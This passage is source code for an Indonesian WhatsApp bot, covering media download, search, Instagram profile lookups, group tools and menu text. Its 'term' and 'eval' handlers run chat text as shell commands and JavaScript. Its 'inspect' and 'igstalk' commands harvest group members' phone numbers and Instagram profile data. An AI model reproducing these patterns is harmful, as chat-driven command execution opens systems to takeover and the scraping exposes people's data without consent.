                    if (Number(yut.videos[0].timestamp.replace(':', '').replace(':', '').replace(':', '')) >= 1000) return reply(`Durasi terlalu panjang, maximal 10 menit!`)
                     var thumbna = await getBuffer(thumb)
                     var capt = `*YOUTUBE PLAY MP3*\n\n≻ *Title :* ${title}\n≻ *Duration :* ${yut.videos[0].timestamp}\n≻ *Url :* ${yut.videos[0].url}\n\n_wait a minute, sending audio..._`
                        itsmevall.sendMessage(from, thumbna, image, {thumbnail: Buffer.alloc(0), quoted: mek, caption: capt})
                        var audionye = await getBuffer(dl_link)
                    if (q.endsWith('--ptt')) {
                        itsmevall.updatePresence(from, Presence.recording)
                        itsmevall.sendMessage(from, audionye, audio, {ptt: true, quoted: mek, mimetype: 'audio/mp4', contextInfo: {externalAdReply: { title: `Youtube Play Music`, body: `${title}`, mediaType: 2, thumbnail: thumbna, mediaUrl: `${yut.videos[0].url}`}}})
                            limitAdd(sender, limit)
                    } else if (q.endsWith('--doc')) {
                        itsmevall.sendMessage(from, audionye, MessageType.document, {quoted: mek, mimetype: 'audio/mp3', filename: `${title}.mp3`, contextInfo: {externalAdReply: { title: `Youtube Play Music`, body: `${title}`, mediaType: 2, thumbnail: thumbna, mediaUrl: `${yut.videos[0].url}`}}})
                            limitAdd(sender, limit)
                    } else {
                        itsmevall.sendMessage(from, audionye, audio, {quoted: mek, mimetype: 'audio/mp4', contextInfo: {externalAdReply: { title: `Youtube Play Music`, body: `${title}`, mediaType: 2, thumbnail: thumbna, mediaUrl: `${yut.videos[0].url}`}}})
                            limitAdd(sender, limit)
                    }
                } catch (err) {
                    sendMess(ownerNumber, 'PlayMp3 Error : ' + err)
                    console.log(color('[PlayMp3]', 'red'), err)
                    reply(mess.error.api)
                }
                break
        case "yts":
      case "ytsearch":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Tolong masukan query!");
        reply (mess.wait)
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await itsmevall.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        tbuff = await getBuffer(aramat[0].image);
        ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        sendButLocation(from, `${ytresult}`,`© REALZIBOT`, {jpegThumbnail:tbuff}, [{buttonId:`${prefix}y`,buttonText:{displayText:'OKE'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
        limitAdd(sender, limit)
      break     
      case "setreply":
      
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        reply(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await itsmevall.downloadMediaMessage(boij);
          fs.writeFileSync(`./media/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await itsmevall.downloadMediaMessage(boij);
          fs.writeFileSync(`./media/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;      
      case "emoji":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (!q) return reply("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        limitAdd(sender, limit)
        break;
///𝑃𝐼𝑅𝑇𝐸𝐾
      case "image":
      case "gimage":
      case "googleimage":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjadi Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        limitAdd(sender, limit)
        break;        
case 'kbbi':
if (!q) return
reply(mess.wait)
ilmu3 = await fetchJson(`https://hardianto.xyz/api/info/kbbi?kata=${q}&apikey=${hardi}`)
ilmu4 =`*Hasil* : ${ilmu3.result.arti}`
reply(ilmu4)
break
      case 'brainly':
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Pertanyaan apa')
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					itsmevall.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
		            }).catch(e => {
					reply('Terjadi kesalahan, coba beberapa saat lagi')
					})
					limitAdd(sender, limit)          
					break
case 'stalkig':
      case 'igstalk':
             if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
             if (isBanned) return reply(mess.ban)
             if (args.length == 0) return reply(`Example: ${prefix + command} ikyy.chan26`)
             reply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://melcanz.com/igstalk?username=${username}&apikey=${melkey}`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.thumbnail)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`📫 Username : ${ini_result.username}\`\`\`
\`\`\`🎞 Nama : ${ini_result.fullname}\`\`\`
\`\`\`📟 Pengikut : ${ini_result.followers}\`\`\`
\`\`\`📮 Mengikuti : ${ini_result.following}\`\`\`
\`\`\`📚 Mengfoloww : ${ini_result.follow}\`\`\`
\`\`\`📻 Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`🗃 Link : https://instagram.com/${ini_result.username}\`\`\`
`
             sendButLocation(from, `${ini_txt}`,`© REALZIBOT`, {jpegThumbnail:ini_buffer}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
             limitAdd(sender, limit)
              break
      case "igstalk":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
        if (!q) return reply("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        limitAdd(sender, limit)
        break;              
      case "term":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return grupinv(`Khusus Owner Kak:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        limitAdd(sender, limit)
        break;
        case 'iguser':
              try {
              if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.me/api/iguser?apikey=${zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              itsmevall.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              reply(`Maaf username ${query} tidak ditemukan`)
}
              break                      
      case "join":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
      if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return reply("pastikan link sudah mekar!");
          var response = await itsmevall.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          reply("LINK ERROR!");
        }
        limitAdd(sender, limit)
        break;
      case "[runtime]":
      case "runtime":
      case "test":
      if (isBanned) return reply(mess.ban)
        if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        run = process.uptime();
        teks = `${kyun(run)}`;
        reply(teks);
        break;      
      case "speed":      
        if (isBanned) return reply(mess.ban)
        if (!isOwner && !mek.key.fromMe) return reply('Only Owner')
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
    
      case "totag":
        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        limitAdd(sender, limit)
        break;                       
      case 'tourl':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
    if (isBanned) return reply(mess.ban)  
    if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await itsmevall.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            limitAdd(sender, limit)
            break
      case "inspect":      
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await itsmevall.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          itsmevall.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          grupinv("Link error");
        }
        break;
      case "eval":
        if (isBanned) return reply(mess.ban)
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        itsmevall.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
//-----------------< Cmd >-------------------
case '📝':
if (isBanned) return reply(mess.ban)
reply(`━━━ 「 *TEXT MAKER* 」 ━━━

• ${prefix}swm <author|packname> (limit)
• ${prefix}take <author|packname> (limit)
• ${prefix}fdeface <reply img / link> (limit)
• ${prefix}fancytext <teks>
• ${prefix}ktpmaker <teks>
• ${prefix}emoji <emojinya>
• ${prefix}halloween <teks>
• ${prefix}vampire <teks>
• ${prefix}codetxt <teks>
• ${prefix}matrix <teks>
• ${prefix}googletxt <teks>
• ${prefix}spiderman <teks>
• ${prefix}express
• ${prefix}maker2d2 <teks>
• ${prefix}maker2d3 <teks>
• ${prefix}maker2d4 <teks>
• ${prefix}maker3d <teks>
• ${prefix}golden <teks>
• ${prefix}flower <teks>
• ${prefix}dance
• ${prefix}wooden <teks>
• ${prefix}burn <teks>
• ${prefix}glow <teks>
• ${prefix}summer <teks>
• ${prefix}neon <teks>
• ${prefix}coffeecup2 <teks>
• ${prefix}coffeecup <teks>
• ${prefix}battlefield <teks|teks>
• ${prefix}googletxt2 <teks>
• ${prefix}transformer <teks>
• ${prefix}nulis <teks>
• ${prefix}text3d <teks>
• ${prefix}warrior <teks>
• ${prefix}blackpink <teks>
• ${prefix}neon <teks>
• ${prefix}greenneon <teks>
• ${prefix}advanceglow <teks>
• ${prefix}futureneon <teks>
• ${prefix}sandwriting <teks>
• ${prefix}sandsummer <teks>
• ${prefix}sandengraved <teks>
• ${prefix}metaldark <teks>
• ${prefix}neonlight <teks>
• ${prefix}holographic <teks>
• ${prefix}text1917 <teks>
• ${prefix}minion <teks>
• ${prefix}deluxesilver <teks>
• ${prefix}newyearcard <teks>
• ${prefix}bloodfrosted <teks>
• ${prefix}halloween <teks>
• ${prefix}jokerlogo <teks>
• ${prefix}fireworksparkle <teks>
• ${prefix}natureleaves <teks>
• ${prefix}bokeh <teks>
• ${prefix}toxic <teks>
• ${prefix}strawberry <teks>
• ${prefix}box3d <teks>
• ${prefix}roadwarning <teks>
• ${prefix}breakwall <teks>
• ${prefix}icecold <teks>
• ${prefix}luxury <teks>
• ${prefix}cloud <teks>
• ${prefix}summersand <teks>
• ${prefix}horrorblood <teks>
• ${prefix}thunder <teks>
• ${prefix}pornhub <teks>
• ${prefix}glitch <teks>
• ${prefix}avenger <teks>
• ${prefix}space <teks>
• ${prefix}ninjalogo <teks>
• ${prefix}marvelstudio <teks>
• ${prefix}lionlogo <teks>
• ${prefix}wolflogo <teks>
• ${prefix}steel3d <teks>
• ${prefix}wallgravity <teks>
• ${prefix}shadow <teks>
• ${prefix}cup <teks>
• ${prefix}cup1 <teks>
• ${prefix}romance <teks>
• ${prefix}smoke <teks>
• ${prefix}burnpaper <teks>
• ${prefix}lovemessage <teks>
• ${prefix}undergrass <teks>
• ${prefix}love <teks>
• ${prefix}coffe <teks>
• ${prefix}woodheart <teks>
• ${prefix}woodenboard <teks>
• ${prefix}summer3d <teks>
• ${prefix}wolfmetal <teks>
• ${prefix}nature3d <teks>
• ${prefix}underwater <teks>
• ${prefix}golderrose <teks>
• ${prefix}summernature <teks>
• ${prefix}letterleaves <teks>
• ${prefix}glowingneon <teks>
• ${prefix}fallleaves <teks>
• ${prefix}flamming <teks>
• ${prefix}harrypotter <teks>
• ${prefix}carvedwood <teks>
• ${prefix}arcade8bit <teks>
• ${prefix}battlefield4 <teks>
• ${prefix}pubg <teks>
• ${prefix}wetglass <teks>
• ${prefix}multicolor3d <teks>
• ${prefix}watercolor <teks>
• ${prefix}luxurygold <teks>
• ${prefix}galaxywallpaper <teks>
• ${prefix}lighttext <teks>
• ${prefix}beautifulflower <teks>
• ${prefix}puppycute <teks>
• ${prefix}royaltext <teks>
• ${prefix}heartshaped <teks>
• ${prefix}birthdaycake <teks>
• ${prefix}galaxystyle <teks>
• ${prefix}hologram3d <teks>
• ${prefix}greenneon <teks>
• ${prefix}glossychrome <teks>
• ${prefix}greenbush <teks>
• ${prefix}metallogo <teks>
• ${prefix}noeltext <teks>
• ${prefix}glittergold <teks>
• ${prefix}textcake <teks>
• ${prefix}starsnight <teks>
• ${prefix}wooden3d <teks>
• ${prefix}textbyname <teks>
• ${prefix}writegalacy <teks>
• ${prefix}galaxybat <teks>
• ${prefix}snow3d <teks>
• ${prefix}birthdayday <teks>
• ${prefix}goldplaybutton <teks>
• ${prefix}silverplaybutton <teks>
• ${prefix}freefire <teks>
• ${prefix}shadow <teks>
• ${prefix}halloween <teks>
• ${prefix}3dgradient <teks>
• ${prefix}naturalleaves <teks>
• ${prefix}dropwater <teks>
• ${prefix}blood <teks>
• ${prefix}blood2 <teks>
• ${prefix}neondevil <teks>
• ${prefix}neon <teks>
• ${prefix}neonlight <teks>
• ${prefix}neonlight2 <teks>
• ${prefix}neonlight3 <teks>
• ${prefix}greenneon <teks>
• ${prefix}toxic <teks>
• ${prefix}matrix <teks>
• ${prefix}thunder <teks>
• ${prefix}thunder2 <teks>
• ${prefix}bokeh <teks>
• ${prefix}carbontext <teks>
• ${prefix}christmas <teks>
• ${prefix}breakwall <teks>
• ${prefix}roadwarning <teks>
• ${prefix}engraved3d <teks>
• ${prefix}embossed <teks>
• ${prefix}writefoggy <teks>
• ${prefix}3dstone <teks>
• ${prefix}futuristic <teks>
• ${prefix}asketch <teks>
• ${prefix}bluecircuit <teks>
• ${prefix}space <teks>
• ${prefix}amagmahot <teks>
• ${prefix}artpapercut <teks>
• ${prefix}3dluxurygold <teks>
• ${prefix}robotr2d2 <teks>
• ${prefix}harrypotter <teks>
• ${prefix}glitch3 <teks>
• ${prefix}greenhorrorstyle <teks>
• ${prefix}3ddeepseametal <teks>
• ${prefix}leddisplayscreen <teks>
• ${prefix}wonderfulgraffitiart <teks>
• ${prefix}8bit <teks>1&<teks>2
• ${prefix}pornhub <teks>1&<teks>2
• ${prefix}glitch <teks>1&<teks>2
• ${prefix}glitch2 <teks>1&<teks>2
• ${prefix}layered <teks>1&<teks>2
• ${prefix}3dsteel <teks>1&<teks>2
• ${prefix}realistic <teks>1&<teks>2
• ${prefix}lionlogo <teks>1&<teks>2
• ${prefix}ninjalogo <teks>1&<teks>2
• ${prefix}wolf <teks>1&<teks>2
• ${prefix}wolf2 <teks>1&<teks>2
• ${prefix}halloween2 <teks>1&<teks>2
• ${prefix}marvel <teks>1&<teks>2
• ${prefix}marvel2 <teks>1&<teks>2
• ${prefix}cinematichorror <teks>1&<teks>2
• ${prefix}avengers <teks>1&<teks>2
• ${prefix}graffiti3 <teks>1&<teks>2
• ${prefix}captainamerica <teks>1&<teks>2
• ${prefix}girlneko <teks>1&<teks>2
• ${prefix}sadboy <teks>1&<teks>2
• ${prefix}kaneki <teks>1&<teks>2
• ${prefix}rem <teks>1&<teks>2
• ${prefix}lolimaker <teks>1&<teks>2
• ${prefix}gura <teks>1&<teks>2
• ${prefix}pipe <teks>
• ${prefix}horor <teks>
• ${prefix}nulis <teks>
• ${prefix}sirkuit <teks>
• ${prefix}discovery <teks>
• ${prefix}fiction <teks>
• ${prefix}demon <teks>
• ${prefix}transformer <teks>
• ${prefix}berry <teks>
• ${prefix}leyered <teks>
• ${prefix}magma <teks>
• ${prefix}stone <teks>
• ${prefix}neon3 <teks>
• ${prefix}broken <teks>
• ${prefix}nulis2 <teks>
• ${prefix}gradient <teks>
• ${prefix}glossy <teks>
• ${prefix}watercolor <teks>
• ${prefix}multicolor <teks>
• ${prefix}neondevil <teks>
• ${prefix}underwater <teks>
• ${prefix}bear <teks>
• ${prefix}glitter7 <teks>
• ${prefix}metale <teks>
`)
break

case '📩':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *DOWNLOAD MENU* 」 ━━━
 
1. *${prefix}play*
_play masukan judul lagu_
Aliases : -
Usage : *${prefix}play baren gates*

2.️ *${prefix}ytmp4*
_Masukan link yt_
Aliases : -
Usage : *${prefix}ytmp4 link yt*

3.️ *${prefix}ytmp3*
_Masukan link yt_
Aliases : -
Usage : *${prefix}ytmp3 link yt*

4.️ *${prefix}instagram*
_Masukan link instagram_
Aliases : -
Usage :  *${prefix}instagram link instagram*

5. *${prefix}twitter*
_Masukan link twitter_
Aliases : -
Usage : *${prefix}twitter link twitter*

6.️ *${prefix}facebook*
_Masukan link facebook_
Aliases : -
Usage : *${prefix}facebook link facebook*

7.️ *${prefix}joox*
_kirim perintah joox judul nya_
Aliases : -
Usage : *${prefix}joox barren gates*

8. *${prefix}googledrive*
_Masukan link googledrive_
Aliases : -
Usage : *${prefix}googledrive link googledrive*

9.️ *${prefix}tiktokmusic*
_Masukan link tiktok_
Aliases : -
Usage : *${prefix}tiktokmusic link tiktok*

10.️ *${prefix}tiktok*
_Masukan link tiktok_
Aliases : -
Usage : *${prefix}tiktok link tiktok*

11.️ *${prefix}tiktoknowm*
_Masukan link tiktok_
Aliases : -
Usage : *${prefix}tiktoknowm link tiktok*

12.️ *${prefix}igtv*
_Masukan link insragram tv_
Aliases : -
Usage : *${prefix}igtv link instagram*

13. *${prefix}pinterest*
_Kirim perintah pinterest judul nya_
Aliases : -
Usage : *${prefix}pinterest wibu*

14.️ *${prefix}soundcloud*
_Kirim perintah soundcloud link_
Aliases : -
Usage : *${prefix}soundcloud*

15.️ *${prefix}cocofun*
_Kirim perintah cocofun link_
Aliases : -
Usage : *${prefix}cocofun*
`)
break

case '🕹':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *EFECT AND MANIPULATION* 」 ━━━

1. *${prefix}wanted*
_nothing_
Aliases : -
Example : -

2. *${prefix}fire*
_nothing_
Aliases : -
Example : -

3. *${prefix}scary*
_nothing_
Aliases : -
Example : -

4. *${prefix}instagramefect*
_nothing_
Aliases : -
Example : -

5. *${prefix}gay*
_nothing_
Aliases : -
Example : -

6. *${prefix}burn*
_nothing_
Aliases : -
Example : -

7. *${prefix}rip*
_nothing_
Aliases : -
Example : -

8. *${prefix}triggered*
_nothing_
Aliases : -
Example : -
`)
break

case '🗳️':
if (isBanned) return reply(mess.ban)
reply(`
━━━ *「* *RANDOM IMAGE* *」* ━━━
 
1. *${prefix}quotesimage*
_Random Image_
Aliases : -
Usage : *${prefix}quotesimage*

2.️ *${prefix}renungan*
_Random Image_
Aliases : -
Usage : *${prefix}renungan*

3.️ *${prefix}wallpaperhacker*
_Random Image_
Aliases : -
Usage : *${prefix}wallpaperhacker*

4.️ *${prefix}wallpaperharley*
_Random Image_
Aliases : -
Usage :  *${prefix}wallpaperharley*

5. *${prefix}wallpaperjoker*
_Random Image_
Aliases : -
Usage : *${prefix}wallpaperjoker*

6.️ *${prefix}wallpapermuslim*
_Random Image_
Aliases : -
Usage : *${prefix}wallpapermuslim*

7.️ *${prefix}wallpapercyberspace*
_Random Image_
Aliases : -
Usage : *${prefix}wallpapercyberspace*

8. *${prefix}wallpapermountain*
_Random Image_
Aliases : -
Usage : *${prefix}wallpapermountain*

9.️ *${prefix}wallpaperprogramming*
_Random Image_
Aliases : -
Usage : *${prefix}wallpaperprogramming*

10.️ *${prefix}wallpapertechnology*
_Random Image_
Aliases : -
Usage : *${prefix}wallpapertechnology*

11.️ *${prefix}fox*
_Random Image_
Aliases : -
Usage : *${prefix}fox*

12.️ *${prefix}dog*
_Random Image_
Aliases : -
Usage : *${prefix}dog*

13. *${prefix}cat*
_Random Image_
Aliases : -
Usage : *${prefix}cat*

14.️ *${prefix}panda*
_Random Image_
Aliases : -
Usage : *${prefix}panda*

15.️ *${prefix}panda1*
_Random Image_
Aliases : -
Usage : *${prefix}panda1*

16.️ *${prefix}bird*
_Random Image_
Aliases : -
Usage : *${prefix}bird*

17.️ *${prefix}koala*
_Random Image_
Aliases : -
Usage : *${prefix}koala*
`)
break

case '??':
if (isBanned) return reply(mess.ban)
reply(`
━━━ 「 *GAME* 」 ━━━

1. *${prefix}slot*
_judi_
Aliases : -
Example : -

2. *${prefix}tictactoe*
_ttt_
Aliases : -
Example : *.tictactoe (@tag)*

3. *${prefix}tebakgambar*
_tebak gambar bang_
Aliases : -
Example : -

4. *${prefix}tebakanime*
_kalo wibu sejati hafal_
Aliases : -
Example : -

5. *${prefix}caklontong*
_iq tinggi_
Aliases : -
Example : -

6. *${prefix}suit*
_suit yg kalah bugil_
Aliases : -
Example : *.suit (@tag)*

7. *${prefix}family100*
_Pinter pinteran_
Aliases : -
Example : *.family100*

8. *${prefix}tebakbendera*
